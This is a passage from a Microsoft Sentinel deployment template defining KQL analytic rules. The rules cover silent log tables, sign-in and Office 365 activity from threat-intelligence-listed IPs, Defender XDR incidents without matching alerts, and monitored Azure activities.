\"CloudflareHttp_CL\"\n, \"CombinedStealthwatchLogs_CL\"\n, \"Crowdstrike_CL\"\n, \"darktrace_model_alerts_CL\"\n, \"DefenderForCloudEvent_CL\"\n, \"Detections_Data_CL\"\n, \"DeviceTvmSoftwareVulnerabilitiesKB_CL\"\n, \"DevOps_CL\"\n, \"DhcpSrv_CL\"\n, \"DHS_EYGA_Production_Signins_CL\"\n, \"DUO_CL\"\n, \"DuoAdministrator_CL\"\n, \"DuoAuthentication_CL\"\n, \"EgressDefend_CL\"\n, \"ent_cyber_ark_CL\"\n, \"ent_gcp_audit_logs_waf_CL\"\n, \"ent_O365_messagetracking_CL\"\n, \"ent_threatx_CL\"\n, \"eset_CL\"\n, \"ExchangeMessages_CL\"\n, \"F5Telemetry_LTM_CL\"\n, \"FiregenTIvTwo_CL\"\n, \"GCP_SCC_Alerts_CL\"\n, \"gdsiemlogs_CL\"\n, \"gdsiemlogs_CL\"\n, \"GWorkspace_ReportsAPI_admin_CL\"\n, \"GWorkspace_ReportsAPI_login_CL\"\n, \"GWorkspace_ReportsAPI_token_CL\"\n, \"HarmonyEventHub_CL\"\n, \"Imperva_CL\"\n, \"ImpervaWAFCloud_CL\"\n, \"ipqs_reputation_CL\"\n, \"laceworks_alerts_CL\"\n, \"LinuxAudit_CL\"\n, \"LinuxAudit_CL\"\n, \"LogstashOthers_CL\"\n, \"LumuAzureSentinel_CL\"\n, \"McasEntitiesWithThreatScore_CL\"\n, \"MDATPVulnerabilities_CL\"\n, \"meraki_events_CL\"\n, \"meraki_events_CL\"\n, \"meraki_ipflow_CL\"\n, \"meraki_ipflow_CL\"\n, \"meraki_urls_CL\"\n, \"meraki_urls_CL\"\n, \"MerakiCloud_ClientInventory_CL\"\n, \"MerakiCloud_ConfigurationChanges_CL\"\n, \"MerakiCloud_DeviceEvents_CL\"\n, \"MerakiCloud_Events_CL\"\n, \"MerakiCloud_Events_CL\"\n, \"MerakiCloud_OrgSecurityEvents_CL\"\n, \"MerakiConfigurationChanges_CL\"\n, \"merakiflow_CL\"\n, \"Mimecast_mail_CL\"\n, \"Mimecast_mail_CL\"\n, \"MimecastAudit_CL\"\n, \"MimecastSiem_CL\"\n, \"MimecastSiem_CL\"\n, \"MongoDBAudit_CL\"\n, \"netflow_CL\"\n, \"Netskope_Alerts_CL\"\n, \"Netskope_Alerts_CL\"\n, \"Netskope_CL\"\n, \"Netskope_Events_CL\"\n, \"Netskope_Events_CL\"\n, \"NexposeInsightVMCloud_assets_CL\"\n, \"NexposeInsightVMCloud_assets_CL\"\n, \"NexposeInsightVMCloud_vulnerabilities_CL\"\n, \"NexposeInsightVMCloud_vulnerabilities_CL\"\n, \"O365_DLP_CL\"\n, \"O365API_CL\"\n, \"OCI_Logs_CL\"\n, \"OfficeActivity_CL\"\n, \"Okta_CL\"\n, \"OktaV2_CL\"\n, \"OnePassword_SignInAttempts_CL\"\n, \"OnePassword_UsageEvents_CL\"\n, \"OrcaAlerts_CL\"\n, \"PaloAltoCortexXDR_Alerts_CL\"\n, \"PaloAltoCortexXDR_Alerts_CL\"\n, \"Perimeter81_CL\"\n, \"PMCloudEPM_CL\"\n, \"prisma_cloud_CL\"\n, \"ProofPointTAPClicksBlocked_CL\"\n, \"ProofPointTAPClicksPermitted_CL\"\n, \"ProofPointTAPMessagesBlocked_CL\"\n, \"ProofPointTAPMessagesDelivered_CL\"\n, \"ProofpointTRAP_CL\"\n, \"QualysHostDetection_CL\"\n, \"QualysHostDetectionV2_CL\"\n, \"QualysHostDetectionV2_CL\"\n, \"Radius_CL\"\n, \"REPORTED_CL\"\n, \"SailPointIDN_Events_CL\"\n, \"SailPointIDN_Events_CL\"\n, \"SalesforceCCwebDAV_CL\"\n, \"SalesforceServiceCloud_CL\"\n, \"SecurityAlert_CL\"\n, \"SentinelLumu_CL\"\n, \"SentinelOne_CL\"\n, \"SFLoginHistory_CL\"\n, \"SFQueryHistory_CL\"\n, \"SigninLogs_CL\"\n, \"Silverfort_CL\"\n, \"Snowflake_CL\"\n, \"SophosCloudOptix_CL\"\n, \"SophosEP_CL\"\n, \"SSH2_CL\"\n, \"symantec_sepm_CL\"\n, \"symantec_sepm_CL\"\n, \"SysSilverfort_CL\"\n, \"system_CL\"\n, \"TargetTableName_CL\"\n, \"TargetTableName_CL\"\n, \"Tenable_IO_Vuln_CL\"\n, \"Tenable_IO_Vuln_CL\"\n, \"tg_ibm_CL\"\n, \"Thinkst_Canary_CL\"\n, \"threat_CL\"\n, \"traffic_CL\"\n, \"TrendMicro_XDR_OAT_CL\"\n, \"TrendMicro_XDR_OAT_CL\"\n, \"TrendMicro_XDR_WORKBENCH_CL\"\n, \"TrendMicro_XDR_WORKBENCH_CL\"\n, \"Ubiquiti_CL\"\n, \"Ubiquiti_CL\"\n, \"url_CL\"\n, \"urlfLog_CL\"\n, \"vcenteafi_vSphere_CLr_CL\"\n, \"vcenter_CL\"\n, \"WDATPMachineList_CL\"\n, \"WHITELISTED_AWS_CL\"\n, \"WindowsDHCP_CL\"\n, \"WizAuditLogs_CL\"\n, \"WizAuditLogsV2_CL\"\n, \"WizIssues_CL\"\n, \"WizIssuesV2_CL\"\n, \"WizIssuesV2_CL\"\n]);\nlet GlobalExcludedTables = dynamic([\n    'MerakiConfigurationChanges_CL'\n    , 'SentinelDeployedPlaybooks_CL'\n    , 'SentinelDeployedAlerts_CL'\n    , 'FiregenTIvTwo_CL'\n    , 'ContainerNodeInventory_CL'\n    , 'meraki_catchall_CL'\n    , 'KubePodInventory_CL'\n    , 'KubeEvents_CL'\n    , 'DuoTelephony_CL'\n    , 'CyleraDevice_CL'\n    , 'fls_sample_log_CL'\n    , 'MerakiCloud_ConfigurationChanges_CL'\n    , 'MerakiCloud_OrgSecurityEvents_CL'\n    , 'ContainerProcess_CL'\n    , 'BV_Automation_Analysis_CL'\n    , 'BV_Automation_Enrichment_CL'\n    , 'BV_IPC_Automation_Audit_CL'\n    , 'BV_Parser_Detailed_Stats_CL'\n    , 'BV_Response_Actions_CL'\n  ]);\nlet description = (table_parameter: (*)){ \ntable_parameter\n| extend all_data = pack_all(false)\n| extend keys = bag_keys(all_data)\n| mv-apply k = keys to typeof(string) on (\n    extend dynamic_entity = parse_json(all_data[k])\n    | extend ExtendedDescription = iff((k startswith 'bv_' or k startswith 'sourcetype') and k != 'bv_raw',strcat(\n    case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n    , strcat(k,': ', all_data[k])\n    )\n    ),'')\n    | summarize ExtendedDescription = make_set(ExtendedDescription), k = make_set(k)\n)\n| extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet logsource_lookBack = 8d;\nlet generated_lookback = 7d;\nlet PreviousAlerts = toscalar(\n    SecurityAlert\n    | where TimeGenerated between (ago(3d) .. now())\n    | where AlertName startswith 'BV-9045'\n    | extend DataType = tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).['Custom Details'])).DataType))[0])\n    | summarize DataType = make_set(DataType)\n    | where isnotempty(DataType)\n);\nlet PreviousLogSources = toscalar(\n    Usage\n    | where TimeGenerated between (ago(logsource_lookBack) .. ago(generated_lookback))\n    | where IsBillable == true\n    | summarize make_set(DataType)\n);\nUsage\n| where TimeGenerated between (ago(generated_lookback) .. now())\n| where DataType has_any (MonitoredTables) \n| where DataType !in~ (GlobalExcludedTables)\n| where DataType !in~ (A9040_EXCLUDED_TABLES)\n| where IsBillable == true\n| where DataType in~ (PreviousLogSources)\n| where DataType !in (PreviousAlerts)\n| extend bv_rule_version = '1.6.5339'\n| extend bv_rule_timestamp = '1718120695.5851061'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.6.5339 bv_rule_timestamp: 1718120695.5851061'\n| project TimeGenerated, DataType, Quantity\n| summarize SumQuantity=sum(Quantity) by DataType, TimeGenerated, DailyMB=Quantity\n| summarize LastEventTime=arg_max(TimeGenerated, *), MaxMB=max(SumQuantity), AvgMB=avg(SumQuantity) by DataType\n| extend PercentChange = strcat(tostring(round((DailyMB-AvgMB)/AvgMB*100,2)),'%')\n| extend TimeDiff = datetime_diff('hour',now(), LastEventTime)\n| extend DayDiff = datetime_diff('day',now(), LastEventTime)\n| extend ModHour = TimeDiff % 24\n| extend Threshold_TimeToMonitor = iff(isnotempty(LOGSOURCE_TIMETOMONITOR[DataType]), LOGSOURCE_TIMETOMONITOR[DataType], LOGSOURCE_TIMETOMONITOR['Default'])\n| extend H_or_DayDiff = iff(Threshold_TimeToMonitor contains 'h', TimeDiff, DayDiff)\n| extend H_or_DaySuffix = iff(Threshold_TimeToMonitor contains 'h', 'Hours', 'Days')\n| extend Threshold = toint(replace_regex(tostring(Threshold_TimeToMonitor), @'[h|d]', ''))\n| where H_or_DayDiff >= Threshold\n| extend CustomerTable = iff(DataType in (A9040_CUSTOMER_TABLES), true, false)\n| extend Tags = 'tag: Health'\n| extend DataTable = DataType\n| extend AlertName = strcat('BV-9045: [Health] Silent Logs CL table - Events in table ', DataTable ,' have not been seen in ', Threshold, ' ', H_or_DaySuffix)\n//| project-away H_or_DaySuffix, DataType\n| extend ExtendedDescription=strcat('Data table ', DataTable, ' has not been seen for at least ', Threshold_TimeToMonitor)\n| extend sourcetype = DataTable\n//| extend bv_alarm_type = 'EFD'\n//| extend bv_alarm_sub_type = 'Silent Logs'\n|extend bv_end_time = LastEventTime\n|extend bv_alarm_threshold = Threshold_TimeToMonitor\n|extend bv_alarm_value = strcat(H_or_DayDiff,H_or_DaySuffix)\n|extend bv_mss_category = 'LogSource Disruption'\n  , bv_alarm_type = 'Silent Log'\n  , bv_alarm_sub_type = 'EFD v1.0'\n  , bv_alarm_name = 'BV-9045'\n| invoke description()\n| extend bv_rule_version = '1.6.5339'\n| extend bv_rule_timestamp = '1718120695.5851061'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.6.5339 bv_rule_timestamp: 1718120695.5851061'\n| project-keep bv_end_time \n  , bv_*\n  , DailyMB\n  , SumQuantity\n  , MaxMB\n  , AvgMB\n  , PercentChange\n  , TimeDiff\n  , DayDiff\n  , ModHour\n  , bv_alarm_threshold \n  , bv_alarm_value\n  , H_or_DayDiff\n  , Threshold\n  , CustomerTable\n  , Tags\n  , DataTable \n  , AlertName\n  , ExtendedDescription\n  , bv_alarm_sub_type\n  , bv_alarm_type \n  , sourcetype\n  , bv_rule_combined_string",
          "queryFrequency": "PT2H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "{{AlertName}}",
            "alertDescriptionFormat": "This alert identifies when logs have not been seen in the past {{bv_alarm_threshold}} for one or more CL tables as detailed in the results. {{ExtendedDescription}} Category: Sentinel Usage {{Tags}}"
          },
          "customDetails": {
            "DataType": "DataTable"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-233')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-233')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-233: [RBA] Azure AD - ThreatIntelligenceIndicator on IP",
          "description": "This alert indicates that one or more SignInLogs activities have been detected as having been performed from IPs listed in the ThreatIntelligenceIndicator table. MITRE: T1212,T1211,T1068,T1210 Category: Entra ID tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nunion isfuzzy=true\n(ThreatIntelligenceIndicator\n| where TimeGenerated >= ago(ioc_lookBack) and ExpirationDateTime > now()\n| where Active == true\n| where isnotempty(NetworkIP) or isnotempty(EmailSourceIpAddress) or isnotempty(NetworkDestinationIP) or isnotempty(NetworkSourceIP)\n| extend TI_ipEntity = iff(isnotempty(NetworkIP), NetworkIP, NetworkDestinationIP)\n| extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(NetworkSourceIP), NetworkSourceIP, TI_ipEntity)\n| extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(EmailSourceIpAddress), EmailSourceIpAddress, TI_ipEntity)\n| extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(NetworkCidrBlock),  extract('(.+)/32',1,NetworkCidrBlock), TI_ipEntity)\n      , sourcetype = Type\n),\n( ThreatIntelIndicators \n| where TimeGenerated >= ago(ioc_lookBack) and ValidUntil > now()\n| where IsActive\n| summarize arg_max(TimeGenerated, *) by Id\n| extend bv_threat_name = tostring(Data.indicator_types)\n| parse Pattern with '[' ioc_category ':' *\n| extend ioc_category = tostring(split(ioc_category, ' = ')[0])\n| parse Pattern with * \" = '\" ioc_value \"']\" *      \n| extend ioc_value = coalesce(ioc_value, ObservableValue)\n| extend TI_ipEntity = iff(ioc_category has_any ('ipv4-addr', 'ipv6-addr'), ioc_value, '')\n      , sourcetype = Type\n| where isnotempty(TI_ipEntity)\n)\n| join (\n    SigninLogs\n    | where TimeGenerated >= ago(dt_lookBack)\n    | extend StatusCode = tostring(Status.errorCode), StatusDetails = tostring(Status.additionalDetails)\n    | extend Region = tostring(LocationDetails['countryOrRegion']), State = tostring(LocationDetails['state']), City = tostring(LocationDetails['city'])\n    | extend SigninLogs_TimeGenerated = TimeGenerated\n    )\n    on $left.TI_ipEntity == $right.IPAddress\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| project LatestIndicatorTime, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore, SigninLogs_TimeGenerated, \n    TI_ipEntity, IPAddress, UserPrincipalName, AppDisplayName, StatusCode, StatusDetails, NetworkIP, NetworkDestinationIP, NetworkSourceIP, EmailSourceIpAddress, Region, State, sourcetype\n| extend timestamp = SigninLogs_TimeGenerated, AccountCustomEntity = UserPrincipalName, IPCustomEntity = IPAddress, URLCustomEntity = Url",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess",
            "DefenseEvasion",
            "LateralMovement",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1212",
            "T1211",
            "T1068",
            "T1210"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "URLCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-212')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-212')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-212: [RBA] O365 - activities from IP listed in the ThreatIntelligenceIndicator table",
          "description": "This alert indicates that one or more Office 365 activities such as mailbox logins, SharePoint file access and other have been detected as having been performed from IPs listed in the ThreatIntelligenceIndicator table. MITRE: T1212,T1211,T1068,T1210 Category: DefenderXDR,Microsoft Defender XDR tag: RBA",
          "severity": "High",
          "enabled": true,
          "query": "let dt_lookBack = 1d;\nlet ioc_lookBack = 14d;\nunion isfuzzy=true\n(ThreatIntelligenceIndicator\n| where TimeGenerated >= ago(ioc_lookBack) and ExpirationDateTime > now()\n| where Active == true\n| where isnotempty(NetworkIP) or isnotempty(EmailSourceIpAddress) or isnotempty(NetworkDestinationIP) or isnotempty(NetworkSourceIP)\n| extend TI_ipEntity = iff(isnotempty(NetworkIP), NetworkIP, NetworkDestinationIP)\n| extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(NetworkSourceIP), NetworkSourceIP, TI_ipEntity)\n| extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(EmailSourceIpAddress), EmailSourceIpAddress, TI_ipEntity)\n| extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(NetworkCidrBlock),  extract('(.+)/32',1,NetworkCidrBlock), TI_ipEntity)\n      , sourcetype = Type\n),\n( ThreatIntelIndicators \n| where TimeGenerated >= ago(ioc_lookBack) and ValidUntil > now()\n| where IsActive\n| summarize arg_max(TimeGenerated, *) by Id\n| extend bv_threat_name = tostring(Data.indicator_types)\n| parse Pattern with '[' ioc_category ':' *\n| extend ioc_category = tostring(split(ioc_category, ' = ')[0])\n| parse Pattern with * \" = '\" ioc_value \"']\" *      \n| extend ioc_value = coalesce(ioc_value, ObservableValue)\n| extend TI_ipEntity = iff(ioc_category has_any ('ipv4-addr', 'ipv6-addr'), ioc_value, '')\n      , sourcetype = Type\n| where isnotempty(TI_ipEntity)\n)\n| join (\n    OfficeActivity | where TimeGenerated >= ago(dt_lookBack)\n    | extend OfficeActivity_TimeGenerated = TimeGenerated\n)\non $left.TI_ipEntity == $right.ClientIP\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| project LatestIndicatorTime, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore, OfficeActivity_TimeGenerated, \nTI_ipEntity, ClientIP, UserId, Operation, ResultStatus, RecordType, OfficeObjectId, NetworkIP, NetworkDestinationIP, NetworkSourceIP, EmailSourceIpAddress, sourcetype\n| extend timestamp = OfficeActivity_TimeGenerated, IPCustomEntity = ClientIP, AccountCustomEntity = UserId, URLCustomEntity = Url",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess",
            "DefenseEvasion",
            "LateralMovement",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1212",
            "T1211",
            "T1068",
            "T1210"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "timestamp": "timestamp"
          },
          "entityMappings": [
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "URLCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-30003')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-30003')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-30003: [SOC] XDR Incident Wrapper - Multistage Incidents Without Corresponding Alerts",
          "description": "This query is used to show incidents getting adjusted by Defender 365/XDR without any associated alerts in the SecurityAlert table MITRE:  Category: SecurityAlert,SecurityIncident tag: SOC",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 7m;\nlet latency = 6h;\nlet end_time = now();\nlet start_time_historical=47h;\nlet alert_id = 'BV-30003';\nlet GetAlertData = materialize(bv_split_security_alert\n| where TimeGenerated >= ago(start_time_historical))\n;      \nlet Previous30kAlertIds = toscalar(GetAlertData\n|where AlertName has_any ('BV-30000', 'BV-30001', 'BV-30002')\n| summarize count(), arg_max(TimeGenerated, *) by AlertName\n| parse AlertName with * '|' incident_name\n| summarize incident_name = make_set_if(incident_name, isnotempty(incident_name)))\n;\nlet PreviousBVAlertIds = toscalar(\nGetAlertData\n| where TimeGenerated >= ago(1d)\n| where AlertName startswith 'BV-9' and AlertName !startswith 'BV-91' and AlertName !has '[Health]'\n| extend OriginalAlertID = tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).[\"Custom Details\"])).bv_orig_alert_id))[0])\n|summarize OriginalAlertID=make_set_if(OriginalAlertID, isnotempty(OriginalAlertID))\n);\nlet PreviousAlert = toscalar(\nGetAlertData\n| where AlertName has alert_id\n| extend IdentifiedIncidentName = tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).[\"Custom Details\"])).IdentifiedIncName))[0])\n|summarize IdentifiedIncidentName=make_set_if(IdentifiedIncidentName, isnotempty(IdentifiedIncidentName))\n);   \nlet AlertDetails = GetAlertData\n| where TimeGenerated >= ago(start_time + latency)\n| extend analytic_rules = tostring(parse_json(tostring(parse_json(ExtendedProperties).[\"Analytic Rule Ids\"])))\n| where isempty(analytic_rules) and analytic_rules <> '[]'\n| summarize AlertName = make_set(AlertName), AlertSev = make_set(AlertSeverity), AlertType = make_set(AlertType) by SystemAlertId;\nlet IncidentStats = materialize(SecurityIncident\n| where TimeGenerated >= ago(start_time + latency) and CreatedTime >= ago(start_time + latency) \n| where ProviderName has_any ('Microsoft 365 Defender', 'Microsoft XDR')\n| summarize arg_max(LastModifiedTime, *) by IncidentNumber\n| where Status == 'New' and IncidentName !in~ (Previous30kAlertIds)\n| mv-expand SystemAlertId = AlertIds\n| extend SystemAlertId = tostring(SystemAlertId)\n| join kind=leftouter AlertDetails on SystemAlertId);\nlet CheckCustomStuff = IncidentStats\n      | summarize event_cnt = dcountif(SystemAlertId, isnotempty(AlertType)), alert_id_cnt = take_any(array_length(AlertIds)) by tostring(AlertType), IncidentNumber\n      | extend Percentage = todouble(round(100.0 * event_cnt / alert_id_cnt, 2))\n      | where isnotempty(AlertType)\n;\nIncidentStats\n| where isempty(SystemAlertId1) and PreviousBVAlertIds !has SystemAlertId \n| summarize arg_max(LastModifiedTime, *) by IncidentNumber\n| join kind=leftouter CheckCustomStuff on IncidentNumber\n| where not(event_cnt >= 2 or Percentage >= 50)\n| where not(AlertType1 has_any ('CustomerTI', 'CustomDetection'))\n| where isempty(SystemAlertId1) and IncidentName !in~ (PreviousAlert) and Severity != 'Informational'              \n| extend AlertProductNames = parse_json(tostring(AdditionalData.alertProductNames)), AlertCount = tostring(AdditionalData.alertsCount)\n| where Comments !contains \"BlueVoyant SOC\" and Owner !contains \"BVSOC@blueteamglobal.com\" and ClassificationComment !contains \"BlueVoyant has investigated\" and ModifiedBy <> 'Fusion'\n| where RelatedAnalyticRuleIds == '[]' and (array_length(AlertProductNames) > 1 or Title contains 'Multi-stage')\n| where not(AlertProductNames has_any (\"microsoftInsiderRiskManagement\",\"Microsoft 365 Insider Risk Management\"))\n| extend ExtendedDescription = strcat('TimeGenerated: ', TimeGenerated, '\\n', 'AlertName: ', Title, '\\n', 'IncidentNumber: ', IncidentNumber, '\\n\\nTo triage this alert, please visit the following link:\\n\\n', IncidentUrl)\n| project TimeGenerated, LastModifiedTime, IncidentName, IncidentNumber, Title, Severity, Status, AlertProductNames, Comments, IncidentUrl, ProviderName, ExtendedDescription, SystemAlertId, AlertType, AlertCount",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT47H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-30003: [SOC] {{Title}} {{SystemAlertId}}|{{IncidentName}}",
            "alertDescriptionFormat": "{{ExtendedDescription}}"
          },
          "customDetails": {
            "IdentifiedIncName": "IncidentName"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-056')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-056')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-056: [RBA] Azure Activity - Monitored Activities",
          "description": "This alert identifies a list of Azure activities that require additional scrutiny. MITRE: T1578 Category: Azure Activity tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 1h;\nlet end_time = now();\nlet latency = 10m;\nlet alert_bin = 1h;\nlet alert_type = 'RBA';\nlet alert_id = 'BV-056:';\nlet start_time_suppress = 1d;\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n}; \nlet global_config = dynamic({\n'EXCLUSION': dynamic([{}])\n, 'excluded_dedup_hash_fields': dynamic([''])\n});\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV056_CONFIG['RBASCORE']),1.0);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV056_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet field_filter = array_concat(bv_global_field_filter, dynamic(['bv_start_time']));\nlet excluded_description_fields = dynamic(['']);\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);     \nlet match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        